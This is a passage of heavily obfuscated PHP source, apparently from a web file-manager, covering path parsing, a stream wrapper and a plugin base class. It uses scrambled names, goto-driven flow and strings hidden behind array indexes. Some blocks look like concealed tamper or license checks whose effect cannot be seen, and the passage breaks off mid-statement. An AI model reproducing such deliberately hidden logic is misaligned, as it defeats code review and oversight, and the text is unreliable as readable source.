show_json($EÖÀŸ‚ˆ[995], !1); } } $aÜÁ´…¥Û¶ = isset($Bª‰ù“Œ) ? $Bª‰ù“Œ[$EÖÀŸ‚ˆ[76]] : $Dƒê‹ùáˆ’; goto d‹¤®¢§çï; aé¤Î‚†ï‰: return $A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[992]]; goto BÔ´¡Äè‘†; d‹¤®¢§çï: $a­Æ“Ó•á = self::info($aÜÁ´…¥Û¶); $a„ÙŸÛêÜÈ = self::fileExt($a­Æ“Ó•á); $b­Êé£†õÏ = self::tmpFileName($a­Æ“Ó•á); goto c“¹ÖÂ¼¦; b¦†¬ÇÄĞ: if (!is_dir($A¤íË±Öå’)) { mk_dir($A¤íË±Öå’); } $eùÖïÌ³´ = $A¤íË±Öå’ . $EÖÀŸ‚ˆ[8] . $F²õğœ¸¿²; if (!@file_exists(self::iconvSystem($eùÖïÌ³´))) { if (isset($Bª‰ù“Œ)) { url_request($Dƒê‹ùáˆ’, $EÖÀŸ‚ˆ[997], $eùÖïÌ³´); } else { $F„‘Ù¶ÂÙ­ = self::localFilePath($Dƒê‹ùáˆ’, $a„ÙŸÛêÜÈ); $eùÖïÌ³´ = $F„‘Ù¶ÂÙ­ ? $F„‘Ù¶ÂÙ­ : self::download($Dƒê‹ùáˆ’, $eùÖïÌ³´); } } goto e¡ù¦Óë‚¤; f©ÎÁƒòÙã: $EÏŒõîÄ“À = json_encode($A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[992]]); self::setContent($fƒ¬¼‰Àá³, $EÏŒõîÄ“À); if (count($A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[992]]) >= $A¹„¥¶¤÷¶) { show_json(sprintf(LNG($EÖÀŸ‚ˆ[996]), count($A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[992]])), !1); } goto aé¤Î‚†ï‰; BÔ´¡Äè‘†: } private static function fileExt($E¥¢–Ã ‘à) { $BœËç‹·ƒ‹ =& $_SERVER[‘®…¢À]; $E«°ÊÍ¾² = $E¥¢–Ã ‘à[$BœËç‹·ƒ‹[157]]; if ($E«°ÊÍ¾² == $BœËç‹·ƒ‹[999]) { $bõ²îÓÒí = $BœËç‹·ƒ‹[1000]; if (substr($E¥¢–Ã ‘à[$BœËç‹·ƒ‹[28]], -strlen($bõ²îÓÒí)) == $bõ²îÓÒí) { $E«°ÊÍ¾² = $BœËç‹·ƒ‹[1001]; } } self::archiveExt($E«°ÊÍ¾²); return $E«°ÊÍ¾²; } private static function zipFileList($cÚŞ†´ôŒÅ, $EÕÎÄº…Ş = false) { $A ¨Á„¡øø =& $_SERVER[‘®…¢À]; $dÒÄ¨Ì½¾” = array(); foreach ($cÚŞ†´ôŒÅ as $dÏİğ§éŸ) { $Eİß¥õÎßÔ = $dÏİğ§éŸ[$A ¨Á„¡øø[76]]; if ($EÕÎÄº…Ş) { $Eİß¥õÎßÔ = self::copy($dÏİğ§éŸ[$A ¨Á„¡øø[76]], $EÕÎÄº…Ş, $A ¨Á„¡øø[727]); } if ($Eİß¥õÎßÔ && self::local()->exist($Eİß¥õÎßÔ)) { $dÒÄ¨Ì½¾”[$dÏİğ§éŸ[$A ¨Á„¡øø[76]]] = $Eİß¥õÎßÔ; } } if (!empty($dÒÄ¨Ì½¾”)) { return array_values($dÒÄ¨Ì½¾”); } show_json(LNG($A ¨Á„¡øø[1002]), !1); } public static function tmpFileName($fÊ¿ÍÒçù¢) { $eÀÏ¿÷¾±ò =& $_SERVER[‘®…¢À]; $Bª»¢Ù‘õ = array($fÊ¿ÍÒçù¢[$eÀÏ¿÷¾±ò[28]], $fÊ¿ÍÒçù¢[$eÀÏ¿÷¾±ò[76]], $fÊ¿ÍÒçù¢[$eÀÏ¿÷¾±ò[78]], $fÊ¿ÍÒçù¢[$eÀÏ¿÷¾±ò[454]]); return md5(implode($eÀÏ¿÷¾±ò[71], $Bª»¢Ù‘õ)); } private static function localFilePath($C†çŠ×ÛÌ¨, $E„’æ®×ãº) { goto aØ»áÃÊ½‹; bŠ­¶õÑÛ‚: if ($A—Á°¨…ãñ == $E—±éˆ«Â‰[104] || $A—Á°¨…ãñ == $E—±éˆ«Â‰[1006]) { if (!$dÔŠÁéŠ£->exist($dÔŠÁéŠ£->path)) { show_json(LNG($E—±éˆ«Â‰[103]), !1); } return $dÔŠÁéŠ£->path; } return !1; goto eØÃ‹ÀË é; DË’Õ‹³³Î: if ($FâÁ†²‰¾[$E—±éˆ«Â‰[29]] == KodIO::KOD_SOURCE) { $b¾œ¾Ÿí³Ş = Model($E—±éˆ«Â‰[735])->fileInfoGet(KodIO::sourceID($C†çŠ×ÛÌ¨)); if (!$b¾œ¾Ÿí³Ş[$E—±éˆ«Â‰[76]]) { show_json($E—±éˆ«Â‰[1005], !1); } $C†çŠ×ÛÌ¨ = $b¾œ¾Ÿí³Ş[$E—±éˆ«Â‰[76]]; } $dÔŠÁéŠ£ = self::init($C†çŠ×ÛÌ¨); $A—Á°¨…ãñ = $dÔŠÁéŠ£->getType(); goto bŠ­¶õÑÛ‚; aØ»áÃÊ½‹: $E—±éˆ«Â‰ =& $_SERVER[‘®…¢À]; if ($E„’æ®×ãº == $E—±éˆ«Â‰[1003] && strtoupper(substr(PHP_OS, 0, 3)) == $E—±éˆ«Â‰[1004]) { return !1; } $FâÁ†²‰¾ = KodIO::parse($C†çŠ×ÛÌ¨); goto DË’Õ‹³³Î; eØÃ‹ÀË é: } private static function archiveExt($a ‘Ììäë‘ = '') { $GLOBALS[$_SERVER[‘®…¢À][1007]] = $a ‘Ììäë‘; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\x52\145\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\106\x69\154\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\x69\154\x65\x54\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\157\157\164\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\163\145\162\x53\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\x68\141\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\x72\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\145\111\164\145\x6d\114\151\156\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\162\122\x65\x6e\x63\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\x65\162\x7d"; public static function typeList() { $Ašê ‚„ïÜ =& $_SERVER[‘®…¢À]; return array($Ašê ‚„ïÜ[1008] => self::KOD_SOURCE, $Ašê ‚„ïÜ[1009] => self::KOD_USER_RECYCLE, $Ašê ‚„ïÜ[1010] => self::KOD_USER_FAV, $Ašê ‚„ïÜ[1011] => self::KOD_USER_FILE_TAG, $Ašê ‚„ïÜ[1012] => self::KOD_USER_FILE_TYPE, $Ašê ‚„ïÜ[1013] => self::KOD_GROUP_ROOT_SELF, $Ašê ‚„ïÜ[1014] => self::KOD_USER_SHARE, $Ašê ‚„ïÜ[1015] => self::KOD_USER_SHARE_LINK, $Ašê ‚„ïÜ[1016] => self::KOD_USER_SHARE_TO_ME, $Ašê ‚„ïÜ[1017] => self::KOD_SHARE_ITEM, $Ašê ‚„ïÜ[1018] => self::KOD_SHARE_LINK, $Ašê ‚„ïÜ[1019] => self::KOD_SEARCH, $Ašê ‚„ïÜ[1020] => self::KOD_BLOCK, $Ašê ‚„ïÜ[1021] => self::KOD_IO, $Ašê ‚„ïÜ[1022] => self::KOD_USER_RECENT, $Ašê ‚„ïÜ[1023] => self::KOD_USER_DRIVER); } public static function parse($fóàá‰…ƒ) { goto FÏƒÅŒ»Ğ‘; D—ø‹ø¸ã: $bÓ¡ÖîÙÏå = array($bĞŒ÷²½[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $E††°§¦ä[$bĞŒ÷²½[1028]] = in_array($E††°§¦ä[$bĞŒ÷²½[29]], $bÓ¡ÖîÙÏå); return $E††°§¦ä; goto Bô¹ì¦Ò¬; CŠ°Û¡„Ç›: preg_match($bĞŒ÷²½[1024], $fóàá‰…ƒ, $FäèİÄÈ‚¿); $E††°§¦ä = array($bĞŒ÷²½[384] => !1, $bĞŒ÷²½[1025] => !1, $bĞŒ÷²½[381] => !1, $bĞŒ÷²½[76] => $fóàá‰…ƒ, $bĞŒ÷²½[969] => !1, $bĞŒ÷²½[968] => $bĞŒ÷²½[33]); if (is_array($FäèİÄÈ‚¿) && count($FäèİÄÈ‚¿) == 5) { $aæï‡…Ş÷ = $bĞŒ÷²½[1026] . $FäèİÄÈ‚¿[2] . $bĞŒ÷²½[312]; if (in_array($aæï‡…Ş÷, $BŸ¯áò°’¯)) { $E††°§¦ä[$bĞŒ÷²½[969]] = $FäèİÄÈ‚¿[1]; $E††°§¦ä[$bĞŒ÷²½[29]] = $aæï‡…Ş÷; $E††°§¦ä[$bĞŒ÷²½[1027]] = substr($aæï‡…Ş÷, 1, -1); $E††°§¦ä[$bĞŒ÷²½[363]] = $FäèİÄÈ‚¿[3]; } $E††°§¦ä[$bĞŒ÷²½[968]] = $FäèİÄÈ‚¿[4]; } goto D—ø‹ø¸ã; FÏƒÅŒ»Ğ‘: $bĞŒ÷²½ =& $_SERVER[‘®…¢À]; $fóàá‰…ƒ = self::clear($fóàá‰…ƒ); $BŸ¯áò°’¯ = array_values(self::typeList()); goto CŠ°Û¡„Ç›; Bô¹ì¦Ò¬: } public static function clear($b•øã©ğÖÒ) { goto B‡šùë¯Æ; D‡³æ½¸: if ($b•øã©ğÖÒ == $C‘ì¢º¾¥‘[8]) { return $C‘ì¢º¾¥‘[8]; } $b•øã©ğÖÒ = rtrim($b•øã©ğÖÒ, $C‘ì¢º¾¥‘[8]); return $b•øã©ğÖÒ; goto a×‡º‘¶‚Ì; B‡šùë¯Æ: $C‘ì¢º¾¥‘ =& $_SERVER[‘®…¢À]; $b•øã©ğÖÒ = str_replace($C‘ì¢º¾¥‘[96], $C‘ì¢º¾¥‘[8], $b•øã©ğÖÒ); $DëŞôÁ“Ÿ = $C‘ì¢º¾¥‘[1029]; goto F’¢à¶º–Ï; F’¢à¶º–Ï: if (substr($b•øã©ğÖÒ, 0, 3) == $C‘ì¢º¾¥‘[1030]) { $b•øã©ğÖÒ = substr($b•øã©ğÖÒ, 3); } while (strstr($b•øã©ğÖÒ, $DëŞôÁ“Ÿ)) { $b•øã©ğÖÒ = str_replace($DëŞôÁ“Ÿ, $C‘ì¢º¾¥‘[8], $b•øã©ğÖÒ); } $b•øã©ğÖÒ = preg_replace($C‘ì¢º¾¥‘[1031], $C‘ì¢º¾¥‘[8], $b•øã©ğÖÒ); goto D‡³æ½¸; a×‡º‘¶‚Ì: } public static function sourceID($EŸ«ÇÜ§Èê) { $d©ìÁŒ½ÅÌ =& $_SERVER[‘®…¢À]; $bİº™………à = self::parse($EŸ«ÇÜ§Èê); if ($bİº™………à[$d©ìÁŒ½ÅÌ[29]] !== self::KOD_SOURCE) { show_json(LNG($d©ìÁŒ½ÅÌ[1032]), !1); } return $bİº™………à[$d©ìÁŒ½ÅÌ[363]]; } public static function make($FğÅí‘ºŒ¬) { if (!$FğÅí‘ºŒ¬) { return !1; } return self::makePath(self::KOD_SOURCE, intval($FğÅí‘ºŒ¬)); } public static function makeShare($dè„¯î¤„è, $E·ÓàÄÍš) { return self::makePath(self::KOD_SHARE_ITEM, $dè„¯î¤„è, $E·ÓàÄÍš); } public static function makeFileTypePath($e£ÚŒÇ¤ñœ) { return self::makePath(self::KOD_USER_FILE_TYPE, $e£ÚŒÇ¤ñœ); } public static function makeFileTagPath($D„áË©«´Ø) { return self::makePath(self::KOD_USER_FILE_TAG, $D„áË©«´Ø); } public static function makePath($dÍôš°ÕŠæ, $f®âÕ¸©æ› = '', $F±ÇäÊ’¹ = '') { $a´Š‹¶ÒëÅ =& $_SERVER[‘®…¢À]; $aˆÑ­¦·È = substr($dÍôš°ÕŠæ, 1, -1); $DÒø¸’™â³ = $a´Š‹¶ÒëÅ[1033] . $aˆÑ­¦·È . $a´Š‹¶ÒëÅ[708] . $f®âÕ¸©æ› . $a´Š‹¶ÒëÅ[1034]; $DÒø¸’™â³ = $F±ÇäÊ’¹ ? $DÒø¸’™â³ . $F±ÇäÊ’¹ . $a´Š‹¶ÒëÅ[8] : $DÒø¸’™â³; return $DÒø¸’™â³; } public static function hashPath($FÎÏ¸š õ) { $f È°ÇŒË’ =& $_SERVER[‘®…¢À]; $c‡åÊØ¡Øç = is_array($FÎÏ¸š õ) ? $FÎÏ¸š õ : IO::info($FÎÏ¸š õ); $cìó•Å°‹Â = _get($c‡åÊØ¡Øç, $f È°ÇŒË’[1035], $f È°ÇŒË’[33]); if (!$cìó•Å°‹Â) { $a˜¬¬¸óè½ = KodIO::parse($c‡åÊØ¡Øç[$f È°ÇŒË’[76]]); if (!$a˜¬¬¸óè½[$f È°ÇŒË’[29]]) { $cìó•Å°‹Â = IO::hashSimple($c‡åÊØ¡Øç[$f È°ÇŒË’[76]]); } } if (!$cìó•Å°‹Â) { $cìó•Å°‹Â = md5($c‡åÊØ¡Øç[$f È°ÇŒË’[76]] . $c‡åÊØ¡Øç[$f È°ÇŒË’[78]] . $c‡åÊØ¡Øç[$f È°ÇŒË’[108]]); } return $cìó•Å°‹Â; } public static function initSystemPath() { $bÆÕõù»øå =& $_SERVER[‘®…¢À]; $dÂ÷÷£«Œ = array($bÆÕõù»øå[1036] => $bÆÕõù»øå[1037], $bÆÕõù»øå[1038] => $bÆÕõù»øå[1039], $bÆÕõù»øå[1040] => $bÆÕõù»øå[1041], $bÆÕõù»øå[1042] => $bÆÕõù»øå[1043]); foreach ($dÂ÷÷£«Œ as $dŒ¢ÄÕÀ«Ñ => $f†•¡Û³ò) { if (!defined($dŒ¢ÄÕÀ«Ñ)) { define($dŒ¢ÄÕÀ«Ñ, self::systemPath($f†•¡Û³ò)); } } } private static function systemPath($Dˆ¾Ç”İ„¥) { goto F–ŠŠ¦¾“°; A¨×¸«–“‡: if ($Dš’“½æª») { return $Dš’“½æª»; } if ($Dˆ¾Ç”İ„¥ == $bÍõà†Ì[1037]) { $Dš’“½æª» = self::make(Model($bÍõà†Ì[735])->systemRootPathAdd($bÍõà†Ì[1046])); } else { $Dš’“½æª» = self::systemPath($bÍõà†Ì[1037]); $fè……ÏÛºÛ = self::sourceID($Dš’“½æª»); $Dš’“½æª» = self::make(Model($bÍõà†Ì[735])->mkdir($fè……ÏÛºÛ, $Dˆ¾Ç”İ„¥)); } Model($bÍõà†Ì[1045])->set($eÙ¶¾…Ñ, $Dš’“½æª»); goto CÖæÕ²•õ; F–ŠŠ¦¾“°: $bÍõà†Ì =& $_SERVER[‘®…¢À]; $eÙ¶¾…Ñ = $bÍõà†Ì[1044] . ucfirst($Dˆ¾Ç”İ„¥); $Dš’“½æª» = Model($bÍõà†Ì[1045])->get($eÙ¶¾…Ñ); goto A¨×¸«–“‡; CÖæÕ²•õ: return $Dš’“½æª»; goto f’øŸùİƒ¼; f’øŸùİƒ¼: } public static function systemFolder($C©Â‰¾‘®×) { $dĞÑË¸Ğ× = IO_PATH_SYSTEM_SOURCE . $C©Â‰¾‘®×; $A´„ƒŞˆÉ» = Cache::get($dĞÑË¸Ğ×); if (!$A´„ƒŞˆÉ») { $E–í¸¡ùöÛ = IO::infoFull($dĞÑË¸Ğ×); if (!$E–í¸¡ùöÛ) { $A´„ƒŞˆÉ» = IO::mkdir($dĞÑË¸Ğ×, REPEAT_SKIP); } else { $A´„ƒŞˆÉ» = $E–í¸¡ùöÛ[$_SERVER[‘®…¢À][76]]; } Cache::set($dĞÑË¸Ğ×, $A´„ƒŞˆÉ», 3600 * 10); } return $A´„ƒŞˆÉ»; } public static function defaultDriver() { return Model($_SERVER[‘®…¢À][677])->defaultDriver(); } public static function defaultIO() { $C¥Ø£Ø÷«© =& $_SERVER[‘®…¢À]; $CãÈšö¥¿¹ = self::defaultDriver(); return $C¥Ø£Ø÷«©[1047] . $CãÈšö¥¿¹[$C¥Ø£Ø÷«©[363]] . $C¥Ø£Ø÷«©[1034]; } public static function fileTypeList() { $A…¿——†Ÿ =& $_SERVER[‘®…¢À]; $fÈ‡Ñ˜Úæ = $GLOBALS[$A…¿——†Ÿ[6]][$A…¿——†Ÿ[1048]]; foreach ($fÈ‡Ñ˜Úæ as $CÒØìÙÊ¹± => $aÓ¯‹«Ù¾¨) { $d¦šÕ°Ş = $A…¿——†Ÿ[1049] . $CÒØìÙÊ¹±; $BÜ¯¹·Ê“Ó = LNG($d¦šÕ°Ş); if ($d¦šÕ°Ş != $BÜ¯¹·Ê“Ó) { $fÈ‡Ñ˜Úæ[$CÒØìÙÊ¹±][$A…¿——†Ÿ[28]] = $BÜ¯¹·Ê“Ó; } } return $fÈ‡Ñ˜Úæ; } } goto DÚ‰„¬œƒ; DòÁ˜àî—Æ: if ($_SERVER[$_SERVER[‘®…¢À][768]] != $c¸¬¡îØÎ™($CÖæ„Ñ«‘)) { goto C·È—ÇÆ÷›; C·È—ÇÆ÷›: $D£ó×Ñ´æì = $_SERVER[‘®…¢À][771]; $d’¤ğñà = $_SERVER[$_SERVER[‘®…¢À][772]] . $_SERVER[‘®…¢À][773]; $fĞÒ’ÙÍ†Ğ = $D£ó×Ñ´æì($d’¤ğñà); goto A¯Š± Ú ­; A¯Š± Ú ­: $A¨· µÊ–‘ = explode($_SERVER[‘®…¢À][214], $fĞÒ’ÙÍ†Ğ); if (count($A¨· µÊ–‘) < $_SERVER[‘®…¢À][548]) { $dŞİï…òå‡ = $_SERVER[‘®…¢À][774]; $dŞİï…òå‡(); } $c‚¼öÆí›ñ = $_SERVER[‘®…¢À][1075]; goto F‚â‰ğØ; F‚â‰ğØ: $c‚¼öÆí›ñ($CÖæ„Ñ«‘); goto föĞÇÉâäà; föĞÇÉâäà: } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($b™Ç¶ô†ƒß, $d…àƒ‡®Ş = '') { goto aªèó’¸ô«; aªèó’¸ô«: $this->info = $this->info($b™Ç¶ô†ƒß); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‘®…¢À][76]]; goto F¥‰À›ø¯; a¡Ş©Ó§òƒ: return $this->info ? !0 : !1; goto F‹ŞÌîÃ¹; F¥‰À›ø¯: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$b™Ç¶ô†ƒß])) { self::$_chunkBuffer[$b™Ç¶ô†ƒß] = array(); } goto a¡Ş©Ó§òƒ; F‹ŞÌîÃ¹: } function stream_read($B¡Ø„—‘³Ì) { $AšïƒË×¡ = $this->fileSubstr($this->pose, $B¡Ø„—‘³Ì); $this->pose += strlen($AšïƒË×¡); return $AšïƒË×¡; } public function stream_tell() { return $this->pose; } public function stream_seek($A†‡ÕÈ‚Ã™, $d¯ŒÁ¤æ …) { $Cé­Ñ†²‹ê =& $_SERVER[‘®…¢À]; if ($d¯ŒÁ¤æ … == SEEK_SET) { $this->pose = $A†‡ÕÈ‚Ã™; } else { if ($d¯ŒÁ¤æ … == SEEK_CUR) { $this->pose += $A†‡ÕÈ‚Ã™; } else { if ($d¯ŒÁ¤æ … == SEEK_END) { $this->pose = $this->info[$Cé­Ñ†²‹ê[78]] + intval($A†‡ÕÈ‚Ã™); } } } if ($A†‡ÕÈ‚Ã™ < 0) { $this->pose = $this->info[$Cé­Ñ†²‹ê[78]] + $A†‡ÕÈ‚Ã™; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‘®…¢À][78]]; } public function stream_close() { return !0; } public function url_stat($DšÃ·ÕÕƒß, $D°µ¾Ñ–…æ) { $fÜİÃà‹— =& $_SERVER[‘®…¢À]; $B²Şøá–ìæ = $this->info($DšÃ·ÕÕƒß); return array($fÜİÃà‹—[1196] => 0, $fÜİÃà‹—[1197] => 0, $fÜİÃà‹—[12] => 32768 + 511, $fÜİÃà‹—[1198] => 0, $fÜİÃà‹—[1199] => 0, $fÜİÃà‹—[1200] => 0, $fÜİÃà‹—[1201] => 0, $fÜİÃà‹—[78] => $B²Şøá–ìæ[$fÜİÃà‹—[78]], $fÜİÃà‹—[1202] => $B²Şøá–ìæ[$fÜİÃà‹—[1118]], $fÜİÃà‹—[1203] => $B²Şøá–ìæ[$fÜİÃà‹—[108]], $fÜİÃà‹—[1204] => $B²Şøá–ìæ[$fÜİÃà‹—[184]], $fÜİÃà‹—[1205] => 0, $fÜİÃà‹—[1206] => 0); } static $fileInfo = array(); public function info($F‹Õ”İ©êë) { $b¤Óë§¥®Ø = $_SERVER[‘®…¢À][1207]; if (isset(self::$fileInfo[$F‹Õ”İ©êë])) { return self::$fileInfo[$F‹Õ”İ©êë]; } if (substr($F‹Õ”İ©êë, 0, strlen($b¤Óë§¥®Ø)) != $b¤Óë§¥®Ø) { return !1; } self::$fileInfo[$F‹Õ”İ©êë] = IO::info(substr($F‹Õ”İ©êë, strlen($b¤Óë§¥®Ø))); return self::$fileInfo[$F‹Õ”İ©êë]; } public static function read($bÊîæ¨ä·ğ, $DÔÜ»¯ìÚ‘, $a”±Óˆ¹é¢) { goto E™­èùŒÖŒ; DºåŸŸÒØ: $C¦ÄÂ…’²Š = 0; while ($C¦ÄÂ…’²Š < $a”±Óˆ¹é¢) { $b•Í¥–‹ÃÜ = min($F Ì½­‹ï, $a”±Óˆ¹é¢ - $C¦ÄÂ…’²Š); $f¦ê¢ªÛäß .= fread($EÔÎ‰ğƒ, $b•Í¥–‹ÃÜ); $C¦ÄÂ…’²Š += $b•Í¥–‹ÃÜ; } fclose($EÔÎ‰ğƒ); goto cªæõÍºË³; aî…Š‰á‚¥: $F Ì½­‹ï = 8192; fseek($EÔÎ‰ğƒ, $DÔÜ»¯ìÚ‘, SEEK_SET); $f¦ê¢ªÛäß = $A†÷—ƒ‘ˆ†[33]; goto DºåŸŸÒØ; cªæõÍºË³: return $f¦ê¢ªÛäß; goto d…–ÈïÛ°Ë; E™­èùŒÖŒ: $A†÷—ƒ‘ˆ† =& $_SERVER[‘®…¢À]; $EÔÎ‰ğƒ = fopen($bÊîæ¨ä·ğ, $A†÷—ƒ‘ˆ†[1120]); if (!$EÔÎ‰ğƒ) { return $A†÷—ƒ‘ˆ†[33]; } goto aî…Š‰á‚¥; d…–ÈïÛ°Ë: } public function fileSubstr($f¹›å®‡¥Ï, $FÚ¹¡šÔë) { goto bàÏ‚Œ¢İ; a°Ú•©×³: foreach ($AÎÔšŞÜî– as $C¤®…øÍ‡ => $eœ‚…Ò—½Ï) { $C¤®…øÍ‡ = intval($C¤®…øÍ‡); $E„çÙìˆá = $C¤®…øÍ‡ + strlen($eœ‚…Ò—½Ï); if ($f¹›å®‡¥Ï >= $E„çÙìˆá) { continue; } if ($f¹›å®‡¥Ï >= $C¤®…øÍ‡ && $f¹›å®‡¥Ï + $FÚ¹¡šÔë <= $E„çÙìˆá) { return substr($eœ‚…Ò—½Ï, $f¹›å®‡¥Ï - $C¤®…øÍ‡, $FÚ¹¡šÔë); } break; } if (count($AÎÔšŞÜî–) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($BÉ‚©ºƒ¤Ñ[1208], $BÉ‚©ºƒ¤Ñ[1209] . count($AÎÔšŞÜî–) . "\73\163\164\x61\x72\164\x3d{$f¹›å®‡¥Ï}\54\x6c\x65\156\x67\x74\150\75{$FÚ¹¡šÔë}\x3b\160\157\163\x65\x3a{$C¤®…øÍ‡}\176{$E„çÙìˆá}"); throw new Exception($BÉ‚©ºƒ¤Ñ[1210]); } $b¾Õ¢¡ˆÌ´ = intval($f¹›å®‡¥Ï / $f¯»ëÄËº) * $f¯»ëÄËº; goto DÏ×ÑêÖÂä; E„‚¢ŸšÔç: $f¯»ëÄËº = 64 * 1024; $AÎÔšŞÜî– =& self::$_chunkBuffer[$this->path]; if (!$AÎÔšŞÜî–) { $AÎÔšŞÜî– = array(); } goto a±Æ¸“£Ûï; Bõ×ïøˆÓÖ: ksort($AÎÔšŞÜî–); $EÀÇÑÉ— = substr($FÍŒÏĞ‚¥», $f¹›å®‡¥Ï - $b¾Õ¢¡ˆÌ´, $FÚ¹¡šÔë); return $EÀÇÑÉ—; goto b—œÜŞµÜ‹; f±ÆÌ© œ…: $A­ßÑêÑù÷ = $FÚ¹¡šÔë; if ($f¹›å®‡¥Ï < 0) { $f¹›å®‡¥Ï = $cã±¾³ÊÈ‚ + $f¹›å®‡¥Ï; } if ($FÚ¹¡šÔë === !1) { $FÚ¹¡šÔë = $cã±¾³ÊÈ‚ - $f¹›å®‡¥Ï; } goto CïÚ¼±›ŒŒ; bàÏ‚Œ¢İ: $BÉ‚©ºƒ¤Ñ =& $_SERVER[‘®…¢À]; $cã±¾³ÊÈ‚ = $this->info[$BÉ‚©ºƒ¤Ñ[78]]; $C«áòá÷ƒ = $f¹›å®‡¥Ï; goto f±ÆÌ© œ…; a±Æ¸“£Ûï: $C¤®…øÍ‡ = 0; $E„çÙìˆá = 0; $eœ‚…Ò—½Ï = $BÉ‚©ºƒ¤Ñ[33]; goto a°Ú•©×³; DÏ×ÑêÖÂä: $FğÂ½Ùƒ«Ê = ceil(($f¹›å®‡¥Ï + $FÚ¹¡šÔë) / $f¯»ëÄËº) * $f¯»ëÄËº - $b¾Õ¢¡ˆÌ´; $FÍŒÏĞ‚¥» = IO::fileSubstr($this->path, $b¾Õ¢¡ˆÌ´, $FğÂ½Ùƒ«Ê); $AÎÔšŞÜî–[$b¾Õ¢¡ˆÌ´ . $BÉ‚©ºƒ¤Ñ[33]] = $FÍŒÏĞ‚¥»; goto Bõ×ïøˆÓÖ; CïÚ¼±›ŒŒ: if ($f¹›å®‡¥Ï + $FÚ¹¡šÔë > $cã±¾³ÊÈ‚) { $FÚ¹¡šÔë = $cã±¾³ÊÈ‚ - $f¹›å®‡¥Ï; } if ($FÚ¹¡šÔë <= 0) { return $BÉ‚©ºƒ¤Ñ[33]; } if ($f¹›å®‡¥Ï < 0 || $f¹›å®‡¥Ï >= $cã±¾³ÊÈ‚ || $FÚ¹¡šÔë <= 0 || $FÚ¹¡šÔë > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\151\x6c\x65\x52\145\141\x64\x20\x65\162\162\x6f\162\41\x20\x73\x74\x61\x72\164\75{$f¹›å®‡¥Ï}\73\154\145\156\147\164\150\x3d{$FÚ¹¡šÔë}\x3b\x20\163\x69\x7a\145\x3d{$cã±¾³ÊÈ‚}\x3b"); } goto E„‚¢ŸšÔç; b—œÜŞµÜ‹: } private function log($cóáÒÒ¬, $a«©ã´ƒ…) { $bÔÉ§Ä•ƒ =& $_SERVER[‘®…¢À]; $E´Í´êÌ·« = timeFloat() - $this->timeStart; write_log(sprintf($bÔÉ§Ä•ƒ[1211], $cóáÒÒ¬, $this->info[$bÔÉ§Ä•ƒ[28]], $E´Í´êÌ·«, $a«©ã´ƒ…), $bÔÉ§Ä•ƒ[1170]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto f¤ŠŒªÜÏ¸; b¸å¥î«÷: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($A˜êŸµÀî[1212]); goto eëö²³”; A„œ‰ˆ‘İ: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $A˜êŸµÀî[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $A˜êŸµÀî[8]; $this->pluginLangArr = $this->initLang(); goto f´÷èÅÓÓ; f¤ŠŒªÜÏ¸: $A˜êŸµÀî =& $_SERVER[‘®…¢À]; if ($_SERVER[$A˜êŸµÀî[768]] != $_SERVER[$A˜êŸµÀî[769]]) { goto dŠ‰Æ§¥ĞÈ; dŠ‰Æ§¥ĞÈ: $Fæ‘†„«Ûø = $A˜êŸµÀî[770]; $f¿ğŒÈ‰¥¯ = $A˜êŸµÀî[771]; $Cƒİ½†„¥Å = $_SERVER[$A˜êŸµÀî[772]] . $A˜êŸµÀî[773]; goto fŞøÃÁÄó; fŞøÃÁÄó: $f¦ŞªŸÌ† = $f¿ğŒÈ‰¥¯($Cƒİ½†„¥Å); $aÂˆö´Š†® = explode($A˜êŸµÀî[214], $f¦ŞªŸÌ†); if (count($aÂˆö´Š†®) < $A˜êŸµÀî[554]) { $d±¡†âÂ÷å = $A˜êŸµÀî[774]; $d±¡†âÂ÷å(); } goto d‰ì‹‰Ñİ¿; bÎ·ŞŒåµ”: $a¯º‘»ÉÔ­ = 1; while ($a¯º‘»ÉÔ­ > 1) { $a¯º‘»ÉÔ­ = $a¯º‘»ÉÔ­ + 4; $a‰õ‚Óƒì³ = rawurlencode($a¯º‘»ÉÔ­ . $A˜êŸµÀî[357]); } goto CºÓœŠª; d‰ì‹‰Ñİ¿: $eÁäìÈäÂ 